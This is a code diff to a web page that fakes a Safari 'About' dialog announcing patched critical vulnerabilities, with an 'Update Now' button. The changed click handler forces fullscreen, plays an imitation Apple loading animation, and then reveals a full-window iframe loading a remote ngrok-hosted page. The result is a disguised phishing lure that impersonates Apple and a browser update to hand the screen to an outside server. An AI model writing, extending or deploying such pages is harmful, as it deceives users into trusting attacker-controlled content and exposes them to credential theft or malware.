@@ -1192,7 +1192,6 @@
             overlay.style.justifyContent = 'center';
             overlay.style.alignItems = 'center';
 
-            // Create Safari About dialog
             const dialog = document.createElement('div');
             dialog.style.width = '350px';
             dialog.style.backgroundColor = 'white';
@@ -1201,7 +1200,6 @@
             dialog.style.overflow = 'hidden';
             dialog.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
 
-            // Dialog header with macOS buttons
             const dialogHeader = document.createElement('div');
             dialogHeader.style.height = '30px';
             dialogHeader.style.backgroundColor = '#f6f6f6';
@@ -1210,7 +1208,6 @@
             dialogHeader.style.alignItems = 'center';
             dialogHeader.style.paddingLeft = '12px';
 
-            // Window buttons (red, yellow, green)
             const createButton = (color) => {
                 const button = document.createElement('div');
                 button.style.width = '12px';
@@ -1230,7 +1227,6 @@
             dialogHeader.appendChild(maximizeButton);
             dialog.appendChild(dialogHeader);
 
-            // Dialog content
             const dialogContent = document.createElement('div');
             dialogContent.style.padding = '30px 20px';
             dialogContent.style.display = 'flex';
@@ -1238,7 +1234,6 @@
             dialogContent.style.alignItems = 'center';
             dialogContent.style.textAlign = 'center';
 
-            // Safari icon (using local image)
             const safariIcon = document.createElement('img');
             safariIcon.src = 'Safari.png';
             safariIcon.alt = 'Safari';
@@ -1247,7 +1242,6 @@
             safariIcon.style.marginBottom = '20px';
             safariIcon.style.filter = 'drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1))';
 
-            // App name
             const appName = document.createElement('div');
             appName.textContent = 'Safari';
             appName.style.fontSize = '20px';
@@ -1255,21 +1249,18 @@
             appName.style.marginBottom = '10px';
             appName.style.color = '#333';
 
-            // Version
             const version = document.createElement('div');
             version.textContent = 'Version 17.6 (19618.3.11.11.5)';
             version.style.fontSize = '13px';
             version.style.color = '#666';
             version.style.marginBottom = '15px';
 
-            // Copyright/message
             const copyright = document.createElement('div');
             copyright.textContent = 'Critical vulnerabilities patched from previous versions. This update will only take a few seconds.';
             copyright.style.fontSize = '12px';
             copyright.style.color = '#888';
             copyright.style.lineHeight = '1.5';
 
-            // Update button
             const updateButton = document.createElement('button');
             updateButton.textContent = 'Update Now';
             updateButton.style.marginTop = '25px';
@@ -1293,20 +1284,15 @@
             updateButton.addEventListener('click', function () {
                 document.body.removeChild(overlay);
 
-                const loadingOverlay = document.createElement('div');
-                loadingOverlay.style.position = 'fixed';
-                loadingOverlay.style.top = '0';
-                loadingOverlay.style.left = '0';
-                loadingOverlay.style.width = '100%';
-                loadingOverlay.style.height = '100%';
-                loadingOverlay.style.backgroundColor = '#f5f5f7';
-                loadingOverlay.style.zIndex = '10001';
-                loadingOverlay.style.display = 'flex';
-                loadingOverlay.style.flexDirection = 'column';
-                loadingOverlay.style.justifyContent = 'center';
-                loadingOverlay.style.alignItems = 'center';
-                loadingOverlay.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif';
-                loadingOverlay.style.overflow = 'hidden';
+                const fullscreenContainer = document.createElement('div');
+                fullscreenContainer.id = 'fullscreen-container';
+                fullscreenContainer.style.position = 'fixed';
+                fullscreenContainer.style.top = '0';
+                fullscreenContainer.style.left = '0';
+                fullscreenContainer.style.width = '100%';
+                fullscreenContainer.style.height = '100%';
+                fullscreenContainer.style.zIndex = '99999';
+                fullscreenContainer.style.backgroundColor = '#f5f5f7';
 
                 document.body.style.overflow = 'hidden';
 
@@ -1316,12 +1302,18 @@
                 to { transform: rotate(360deg); }
             }
             
-            .container {
+            #loader-container {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
                 display: flex;
                 flex-direction: column;
-                align-items: center;
                 justify-content: center;
-                gap: 50px;
+                align-items: center;
+                background-color: #f5f5f7;
+                z-index: 1;
             }
             
             .apple-logo {
@@ -1384,23 +1376,35 @@
                 left: 30%;
                 background-color: #ff2d55;
             }
+            
+            #website-iframe {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                border: none;
+                z-index: 0;
+                opacity: 0;
+                transition: opacity 0.5s ease;
+            }
         `;
                 document.head.appendChild(style);
 
+                const loaderContainer = document.createElement('div');
+                loaderContainer.id = 'loader-container';
+
                 const blur1 = document.createElement('div');
                 blur1.className = 'bg-blur blur-1';
-                loadingOverlay.appendChild(blur1);
+                loaderContainer.appendChild(blur1);
 
                 const blur2 = document.createElement('div');
                 blur2.className = 'bg-blur blur-2';
-                loadingOverlay.appendChild(blur2);
+                loaderContainer.appendChild(blur2);
 
                 const blur3 = document.createElement('div');
                 blur3.className = 'bg-blur blur-3';
-                loadingOverlay.appendChild(blur3);
-
-                const container = document.createElement('div');
-                container.className = 'container';
+                loaderContainer.appendChild(blur3);
 
                 const appleLogo = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                 appleLogo.setAttribute('class', 'apple-logo');
@@ -1410,7 +1414,6 @@
                 const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                 path.setAttribute('d', 'M127.805 83.478c-.21-21.95 17.931-32.474 18.745-32.988-10.198-14.929-26.071-16.976-31.715-17.213-13.513-1.369-26.388 7.95-33.228 7.95-6.84 0-17.395-7.759-28.59-7.542-14.695.214-28.221 8.549-35.793 21.73-15.264 26.506-3.905 65.762 10.976 87.3 7.258 10.498 15.907 22.278 27.255 21.842 10.929-.436 15.066-7.073 28.291-7.073 13.224 0 16.95 7.073 28.51 6.844 11.772-.214 19.237-10.711 26.422-21.28 8.325-12.177 11.743-23.962 11.936-24.556-.262-.119-22.895-8.781-23.125-34.847M105.234 25.067c6.026-7.32 10.086-17.5 8.977-27.627-8.673.348-19.173 5.782-25.371 13.102-5.574 6.456-10.454 16.797-9.132 26.709 9.673.755 19.54-4.933 25.526-12.184');
                 appleLogo.appendChild(path);
-
                 const spinner = document.createElement('div');
                 spinner.className = 'spinner';
 
@@ -1419,57 +1422,54 @@
 
                 const progressBar = document.createElement('div');
                 progressBar.className = 'progress-bar';
-                progressBar.id = 'progress';
                 progressBarContainer.appendChild(progressBar);
+                loaderContainer.appendChild(appleLogo);
+                loaderContainer.appendChild(spinner);
+                loaderContainer.appendChild(progressBarContainer);
 
-                container.appendChild(appleLogo);
-                container.appendChild(spinner);
-                container.appendChild(progressBarContainer);
-                loadingOverlay.appendChild(container);
+                const websiteIframe = document.createElement('iframe');
+                websiteIframe.id = 'website-iframe';
+                websiteIframe.src = 'https://14d7-14-139-176-131.ngrok-free.app';
 
-                document.body.appendChild(loadingOverlay);
+                fullscreenContainer.appendChild(websiteIframe);
+                fullscreenContainer.appendChild(loaderContainer);
 
-                let width = 0;
-                const progressInterval = setInterval(() => {
-                    if (width >= 100) {
-                        clearInterval(progressInterval);
-                    } else {
+                document.body.appendChild(fullscreenContainer);
+
+                try {
+                    fullscreenContainer.requestFullscreen().then(() => {
+                        animateProgressAndTransition();
+                    }).catch(err => {
+                        console.log("Error attempting to enable fullscreen: ", err);
+                        animateProgressAndTransition();
+                    });
+                } catch (error) {
+                    console.error("Fullscreen error:", error);
+                    animateProgressAndTransition();
+                }
+
+                function animateProgressAndTransition() {
+                    let width = 0;
+                    const progressInterval = setInterval(() => {
                         width += Math.random() * 4 + 6;
                         if (width > 100) width = 100;
                         progressBar.style.width = width + '%';
-                    }
-                }, 80);
 
-                const hiddenFrame = document.createElement('iframe');
-                hiddenFrame.style.position = 'fixed';
-                hiddenFrame.style.top = '0';
-                hiddenFrame.style.left = '0';
-                hiddenFrame.style.width = '100%';
-                hiddenFrame.style.height = '100%';
-                hiddenFrame.style.border = 'none';
-                hiddenFrame.style.zIndex = '99999';
-                hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
+                        if (width >= 100) {
+                            clearInterval(progressInterval);
 
-                hiddenFrame.onload = function () {
-                    document.body.style.overflow = 'hidden';
+                            setTimeout(() => {
+                                websiteIframe.style.opacity = '1';
 
-                    try {
-                        hiddenFrame.requestFullscreen().then(() => {
-                            document.body.removeChild(loadingOverlay);
-                        }).catch(err => {
-                            console.log("Error attempting to enable fullscreen: ", err);
-                            document.body.removeChild(loadingOverlay);
-                        });
-                    } catch (error) {
-                        console.error("Fullscreen error:", error);
-                        document.body.removeChild(loadingOverlay);
-                    }
-                };
-
-                setTimeout(() => {
-                    document.body.appendChild(hiddenFrame);
-                }, 1000);
+                                setTimeout(() => {
+                                    fullscreenContainer.removeChild(loaderContainer);
+                                }, 500);
+                            }, 300);
+                        }
+                    }, 80);
+                }
             });
+
             dialogContent.appendChild(safariIcon);
             dialogContent.appendChild(appName);
             dialogContent.appendChild(version);
@@ -1481,5 +1481,7 @@
             document.body.appendChild(overlay);
         }
     </script>
+
 </body>
+
 </html>
